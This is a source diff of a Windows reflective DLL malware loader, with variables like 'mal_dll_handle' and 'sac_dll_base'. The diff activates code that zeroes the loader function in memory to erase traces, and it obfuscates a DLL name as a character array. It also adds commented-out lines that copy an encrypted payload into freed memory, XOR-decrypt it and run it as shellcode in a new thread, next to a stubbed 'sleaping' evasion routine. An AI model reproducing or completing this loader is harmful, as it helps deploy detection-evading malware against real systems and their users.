@@ -337,10 +337,10 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		);
 	}
 
-	//custom_memzero(
-	//	(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
-	//	dll_hdr->funcSize
-	//);
+	custom_memzero(
+		(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
+		dll_hdr->funcSize
+	);
 
     
     char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };
@@ -742,7 +742,6 @@ static BOOL custom_process_attach(HMODULE hModule)
 
 	PBYTE old_memory = (PBYTE)sac_dll_header->to_free;
 
-
 	// remove the very first buffer allocated for the reflective dll
 	if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
 	{
@@ -764,6 +763,21 @@ static BOOL custom_process_attach(HMODULE hModule)
 	PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
 	if (NtTestAlert_addr == NULL)
 		return FALSE;
+
+	//if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
+	//{
+	//	MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+	//	return FALSE;
+	//}
+
+	//memcpy(old_memory, encrypted_payload_bin, encrypted_payload_bin_len);
+
+ //   for (size_t i = 0, j = 0; i < encrypted_payload_bin_len; i++, j++)
+ //   {
+ //       old_memory[i] = old_memory[i] ^ key[j % key_size];
+ //   }
+
+	//HANDLE shellcode_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)old_memory, 0, 0, 0);
 
 	do
 	{
